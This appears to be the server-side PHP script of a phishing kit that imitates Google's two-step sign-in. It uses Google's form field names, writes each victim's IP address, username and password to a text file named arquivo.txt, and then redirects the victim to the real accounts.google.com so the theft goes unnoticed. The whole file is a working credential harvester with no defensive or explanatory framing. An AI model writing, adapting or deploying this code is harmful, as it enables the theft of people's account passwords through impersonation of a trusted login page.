<?php


$vnome = isset($_POST["identifier"]) ? $_POST["identifier"] : '';
$vsenha = isset($_POST["Passwd"]) ? $_POST["Passwd"] : '';

// Verificar se o campo senha está vazio
if (empty($vsenha)) {
    // Configurar um cookie com o valor do identificador
    setcookie("userIdentifier", $vnome, time() + 3600, "/"); // O cookie expira em 1 hora
    
    // Redirecionar para pass.html
    header("Location: pass.html");
    exit();
}


// Adicionar dados ao arquivo
$name = 'arquivo.txt';
$file = fopen($name, 'a');
fwrite($file, 'IP:');
$string = $_SERVER['REMOTE_ADDR'];
fwrite($file, $string);
fwrite($file, ' nome: ');
fwrite($file, $vnome);
fwrite($file, ' senha: ');
fwrite($file, $vsenha . "\n");
fclose($file);

// Redirecionar para a página principal se a senha estiver definida
header("Location: https://accounts.google.com/");
exit();
